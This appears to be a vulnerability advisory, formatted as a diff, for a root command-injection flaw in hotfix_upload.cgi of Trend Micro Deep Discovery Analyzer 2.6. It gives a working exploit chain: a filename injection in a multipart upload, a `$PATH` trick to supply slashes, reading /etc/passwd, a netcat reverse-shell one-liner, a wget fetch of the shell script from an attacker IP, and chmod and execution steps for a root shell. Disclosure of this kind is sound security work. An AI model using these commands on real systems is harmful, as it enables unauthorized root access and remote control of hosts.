@@ -1,0 +1,54 @@
+Version: TDA 2.6.1062r1
+
+Summary:
+
+The hotfix_upload.cgi file contains a flaw allowing a user to execute commands under the context of the root user.
+
+Details:
+
+The hotfix_upload.cgi file is used to upload files (hot fixes). Below is a sample of the upload function being used:
+
+POST /cgi-bin/hotfix_upload.cgi?sID=hotfix_temp HTTP/1.1
+Accept: image/jpeg, image/gif, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, */*
+Referer: https://<server IP>/cgi-bin/hotfix_history.cgi
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+Content-Type: multipart/form-data; boundary=—————————7e0823930136
+UA-CPU: AMD64
+Accept-Encoding: gzip, deflate
+Host: <server IP>
+Content-Length: 206
+Connection: close
+Cache-Control: no-cache
+Cookie: session_id=
+
+—————————–7e0823930136
+Content-Disposition: form-data; name=”ajaxuploader_file”; filename=”test.txt”
+Content-Type: text/plain
+
+a
+—————————–7e0823930136–
+
+The actual injection takes place in the name of the file being uploaded (ie. filename=”test.txt&id”). By performing the following request, system information is sent back in the response:
+
+http://www.korpritzombie.com/wp-content/uploads/2016/07/1.png
+
+This gives any user the ability to execute simple non interactive commands. However, more complex (including remote shell) commands are possible.
+
+Special characters like ‘/’,'<‘,’>’ are not sent across to the server. But utilizing the environment itself, it becomes possible to insert characters like the ‘/’. Below is an example of a user using this method to retrieve the /etc/passwd file (NOTE: `echo $PATH | cut -c1` will print ‘/‘ to the final command):
+
+http://www.korpritzombie.com/wp-content/uploads/2016/07/2.png
+
+Now the attacker has the ability to create a shell by uploading a file containing the following (where [ip address] is your receiving machine):
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip address] 5555 >/tmp/f
+
+To upload the file, the attacker simply names this file to shell, then uploads using this vulnerability and wget:
+
+test.txt&wget http:`echo $PATH | cut -c1“echo $PATH | cut -c1`[ip]`echo $PATH | cut -c1`shell
+
+Once the file has been uploaded (it will be placed in /opt/TrendMicro/MinorityReport/www/cgi-bin), the attacker can chmod and then execute the file as a script, creating a reverse shell, running as root:
+
+test.xml&chmod a+x shell
+
+test.xml&.`echo $PATH | cut -c1`shell
